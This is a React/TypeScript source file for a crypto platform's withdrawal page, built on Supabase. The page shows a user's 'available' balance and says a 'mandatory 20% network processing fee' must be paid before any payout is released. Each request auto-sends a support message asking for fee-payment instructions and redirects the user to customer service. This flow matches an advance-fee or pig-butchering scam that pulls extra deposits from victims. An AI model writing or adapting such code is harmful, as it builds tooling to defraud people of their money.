import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { useState } from "react";
import { useQuery } from "@tanstack/react-query";
import { supabase } from "@/integrations/supabase/client";
import { useAuth } from "@/lib/auth-context";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import { Badge } from "@/components/ui/badge";
import {
  CircleCheck as CheckCircle2,
  Clock,
  Circle as XCircle,
  Loader as Loader2,
  TriangleAlert as AlertTriangle,
  Headphones,
} from "lucide-react";
import { toast } from "sonner";
import { motion } from "framer-motion";
import { getOrCreateUserSupportThread } from "@/lib/support-service";

export const Route = createFileRoute("/_authenticated/withdraw")({
  component: WithdrawPage,
});

function WithdrawPage() {
  const { user } = useAuth();
  const navigate = useNavigate();
  const [amount, setAmount] = useState("");
  const [currency, setCurrency] = useState("USDT");
  const [wallet, setWallet] = useState("");
  const [submitting, setSubmitting] = useState(false);

  const { data: profile } = useQuery({
    queryKey: ["profile", user?.id],
    queryFn: async () => {
      const { data } = await supabase
        .from("profiles")
        .select("available_cash")
        .eq("id", user!.id)
        .maybeSingle();
      return data;
    },
    enabled: !!user,
  });

  const { data: withdrawals, refetch } = useQuery({
    queryKey: ["my_withdrawals", user?.id],
    queryFn: async () => {
      const { data } = await supabase
        .from("withdrawals")
        .select("*")
        .eq("user_id", user!.id)
        .order("created_at", { ascending: false });
      return data ?? [];
    },
    enabled: !!user,
  });

  const available = Number(profile?.available_cash ?? 0);
  const fee = Number(amount) * 0.2;
  const net = Number(amount) - fee;

  const submit = async () => {
    const amt = Number(amount);
    if (!amt || amt <= 0) return toast.error("Enter a valid amount");
    if (amt > available) return toast.error("Amount exceeds available balance");
    if (!wallet.trim()) return toast.error("Enter your wallet address");
    setSubmitting(true);

    try {
      const { error } = await supabase.from("withdrawals").insert({
        user_id: user!.id,
        amount: amt,
        crypto_currency: currency,
        wallet_address: wallet.trim(),
        status: "pending",
      });
      if (error) throw error;

      const { error: txError } = await supabase.from("transactions").insert({
        user_id: user!.id,
        type: "withdrawal_request",
        amount: amt,
        asset_name: `Pending withdrawal ${currency} (20% fee applies)`,
        status: "pending",
      });
      if (txError) console.error("[withdraw] transaction insert failed:", txError.message);

      const thread = await getOrCreateUserSupportThread(user!.id, user!.email?.split("@")[0]);
      if (thread) {
        await supabase.from("support_messages").insert({
          thread_id: thread.id,
          user_id: user!.id,
          sender: "user",
          body: `Withdrawal request: $${amt.toFixed(2)} ${currency} to ${wallet.trim().slice(0, 16)}…\n\nA mandatory 20% network processing fee ($${fee.toFixed(2)}) applies before the withdrawal can be released. Net payout: $${net.toFixed(2)}. Please provide instructions for fee payment.`,
        });
      }

      toast.success("Withdrawal request submitted");
      setAmount("");
      setWallet("");
      refetch();
      navigate({ to: "/support" });
    } catch (err: any) {
      toast.error(err.message ?? "Submission failed");
    } finally {
      setSubmitting(false);
    }
  };

  return (
    <motion.div
      initial={{ opacity: 0, y: 8 }}
      animate={{ opacity: 1, y: 0 }}
      className="mx-auto max-w-3xl space-y-6"
    >
      <div>
        <h1 className="text-3xl font-bold tracking-tight">Withdraw funds</h1>
        <p className="text-sm text-muted-foreground">
          Request a payout to your crypto wallet. A mandatory 20% network processing fee applies.
        </p>
      </div>

      <Card className="p-4 border-warning/40 bg-warning/5">
        <div className="flex items-start gap-3">
          <AlertTriangle className="mt-0.5 h-5 w-5 shrink-0 text-warning" />
          <div className="text-sm">
            <p className="font-semibold text-warning">Mandatory 20% processing fee</p>
            <p className="mt-1 text-muted-foreground">
              All withdrawals require a 20% network processing fee before funds can be released.
              After submitting your request, you will be redirected to customer service to complete
              the process.
            </p>
          </div>
        </div>
      </Card>

      <Card className="p-6 space-y-5">
        <div className="rounded-lg bg-surface p-3 text-sm">
          Available:{" "}
          <span className="font-semibold tabular-nums">
            ${available.toLocaleString(undefined, { minimumFractionDigits: 2 })}
          </span>
        </div>

        <div className="grid gap-4 sm:grid-cols-2">
          <div className="space-y-2">
            <Label>Currency</Label>
            <Select value={currency} onValueChange={setCurrency}>
              <SelectTrigger>
                <SelectValue />
              </SelectTrigger>
              <SelectContent>
                <SelectItem value="USDT">USDT (TRC20)</SelectItem>
                <SelectItem value="BTC">BTC</SelectItem>
              </SelectContent>
            </Select>
          </div>
          <div className="space-y-2">
            <Label>Amount (USD)</Label>
            <Input
              type="number"
              min={1}
              step="0.01"
              placeholder="100.00"
              value={amount}
              onChange={(e) => setAmount(e.target.value)}
            />
          </div>
        </div>

        {amount && Number(amount) > 0 && (
          <div className="rounded-lg border border-border bg-surface p-3 text-sm space-y-1">
            <div className="flex justify-between">
              <span className="text-muted-foreground">Withdrawal amount</span>
              <span className="tabular-nums">${Number(amount).toFixed(2)}</span>
            </div>
            <div className="flex justify-between">
              <span className="text-muted-foreground">Processing fee (20%)</span>
              <span className="tabular-nums text-destructive">-${fee.toFixed(2)}</span>
            </div>
            <div className="flex justify-between border-t border-border pt-1 font-semibold">
              <span>Net payout</span>
              <span className="tabular-nums text-success">${net.toFixed(2)}</span>
            </div>
          </div>
        )}

        <div className="space-y-2">
          <Label>Your wallet address</Label>
          <Input
            placeholder="Destination address"
            value={wallet}
            onChange={(e) => setWallet(e.target.value)}
          />
        </div>

        <Button onClick={submit} disabled={submitting} className="w-full">
          {submitting && <Loader2 className="mr-2 h-4 w-4 animate-spin" />}
          Submit & contact customer service
        </Button>
      </Card>

      <Card className="p-6">
        <h2 className="mb-4 text-lg font-semibold">Your withdrawal history</h2>
        {!withdrawals?.length ? (
          <p className="text-sm text-muted-foreground">No withdrawals yet.</p>
        ) : (
          <div className="space-y-2">
            {withdrawals.map((w: any) => (
              <div
                key={w.id}
                className="flex flex-wrap items-center justify-between gap-3 rounded-lg border border-border bg-surface px-4 py-3 text-sm"
              >
                <div>
                  <div className="font-semibold tabular-nums">
                    ${Number(w.amount).toFixed(2)}{" "}
                    <span className="text-xs font-normal text-muted-foreground">
                      · {w.crypto_currency}
                    </span>
                  </div>
                  <div className="text-xs text-muted-foreground break-all">{w.wallet_address}</div>
                </div>
                <StatusBadge status={w.status} />
              </div>
            ))}
          </div>
        )}
      </Card>

      <Card className="flex items-center gap-3 p-4 border-primary/30 bg-primary/5">
        <Headphones className="h-5 w-5 text-primary" />
        <div className="text-sm">
          <p className="font-semibold">Need help with your withdrawal?</p>
          <p className="text-muted-foreground">
            Our customer service team will guide you through the fee payment and release process.
          </p>
        </div>
        <Button
          variant="outline"
          size="sm"
          className="ml-auto"
          onClick={() => navigate({ to: "/support" })}
        >
          Contact support
        </Button>
      </Card>
    </motion.div>
  );
}

function StatusBadge({ status }: { status: string }) {
  if (status === "approved")
    return (
      <Badge className="bg-success text-success-foreground">
        <CheckCircle2 className="mr-1 h-3 w-3" /> Approved
      </Badge>
    );
  if (status === "rejected")
    return (
      <Badge variant="destructive">
        <XCircle className="mr-1 h-3 w-3" /> Rejected
      </Badge>
    );
  return (
    <Badge variant="secondary">
      <Clock className="mr-1 h-3 w-3" /> Pending
    </Badge>
  );
}
